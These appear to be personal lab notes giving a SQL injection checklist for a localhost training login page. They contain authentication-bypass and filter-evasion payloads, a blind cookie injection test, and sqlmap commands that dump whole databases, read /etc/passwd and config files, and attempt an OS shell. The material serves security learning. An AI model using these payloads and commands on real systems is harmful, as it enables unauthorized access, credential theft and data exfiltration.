## SQL Injection Checklist for Login Page :

1. **Test Default Login :**
    
    - Since i am in the lab, the default creds are : `jeremy:jeremy`.
        
    - **In Burp Suite :**

```

## REQUEST

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

## RESPONSE


HTTP/1.1 200 OK

```

2. **Confirm SQLi Vulnerability (Authentication Bypass) :**

```
## - Test Basic Bypass in Repeater:

username=admin' OR 1=1#&password=jeremy
username=jeremy' OR 1=1#&password=jeremy
username=jeremy&password=' OR ''='# 
username=admin' OR '1'='1 -- &password=jeremy
username=jeremy%27%20OR%201=1%23&password=jeremy (encoded)

## - Handle Filters:
	- If ' is blocked, try:
	
username=admin" OR "1"="1#&password=jeremy
username=jeremy%27%20OR%20%271%27=%271%23&password=jeremy

	- If spaces are blocked, use /**/:
	
username=admin'/**/OR/**/1=1#&password=jeremy
```

3.  Another test that u can do : 

	-  You can use `substring method` to manually test on cookie. Like this

![[exmaple for substring.png]]

- `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('alex', 1, 1) = 'a'#`
	-  So `('alex', 1, 1) = 'a'#` --> **we are checking if `a` is there in the given word `alex` if its there then you will get the response as we get for sucess** 













## Using SQLMAP :

```
### ✅ 1. Raw Request File

`sqlmap -r request.txt --level=5 --risk=3 --batch --dump`
#### 🔍 What it does :

- Loads a **raw HTTP request** (GET or POST) from a file (`request.txt`)
- sqlmap parses everything: URL, headers, cookies, body
- Tests all parameters inside request (GET, POST, Cookies, etc.)
- Dumps data if injection is found
#### ✅ Use this when :

- - You captured a full login or post-auth request in Burp
- The injection point is deep (e.g. cookie, header, POST field)
- You want **complete control over the entire request**
### ✅ 2. Cookie Injection Without Marker

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=abcdb" --level=5 --risk=3 --dump --batch`
#### 🔍 What it does :

- Targets SQLi at the URL: `/labs/i0x02.php`
- Uses **your provided session cookie**
- **BUT** doesn't specify where in the cookie to inject (no `*`)
- sqlmap **guesses** the injection point
#### ⚠️ Not ideal when :

- You **already know** the cookie is injectable `→` use `*` instead!
### ✅ 3. Cookie Injection With Explicit Marker

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=1*" --level=5 --risk=3 --technique=BEUSTQ --dump`
#### 🔍 What it does :

- Tells sqlmap: "**inject right at the `*` in the cookie value**"
- Focuses only on the **cookie injection point**
- Uses all techniques: Boolean, Error, UNION, Stacked, Time-based, Second-order
- Dumps data if vulnerable
#### ✅ Use this when :

- You know the **session cookie is injectable**
- You want to **speed up testing** and be precise
### ✅ 4. POST Authenticated Attack with Injection Marker

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=abcdb*" --data="username=jeremy&password=jeremy" --level=5 --risk=3 --technique=BEUSTQ --batch`

or

`sqlmap -u "http://localhost/labs/i0x02.php" --cookie="session=abcdb*" --data="username=jeremy&password=jeremy" --level=5 --risk=3 --technique=BEUSTQ --batch --dump-all`
#### ### 🔍 What it does:

- Injects **in the cookie**, at the exact `*` location
- Sends **POST data** to simulate a login (`username=jeremy&password=jeremy`)
- Used on **authenticated pages**
- Enables all techniques and batch mode
### ✅ Use this when:

- You're attacking a **login-required** endpoint
- The cookie is **authenticated session**
- You want to **target post-login SQLi in cookies**
### What i found in the SQLi LAB - 2

##### 5️⃣ 🔐 Try Reading Server Files (if MySQL allows) :

`--file-read="/etc/passwd"`

- Try `/var/www/html/config.php`, or anything with credentials.
##### 6️⃣ 💣 Try Gaining OS Shell Access :

`--os-shell`

- ⚠️ This attempts to write a file and execute a shell command. Only do this in labs or with legal authorization.
##### 7️⃣ 🧠 Resume Session Later :

- You can use the stored session so you don’t repeat scans :
    - `--session=/root/.local/share/sqlmap/output/localhost/session.sqlite`

##### 🧰 Bonus: Full Extraction Command (Dump All)

```
sqlmap -u "http://localhost/labs/i0x02.php" \
--cookie="session=abcdb*" \
--data="username=jeremy&password=jeremy" \
--dump-all --batch
```

- 💡 Let it run. Go grab coffee. Come back to the full DB.
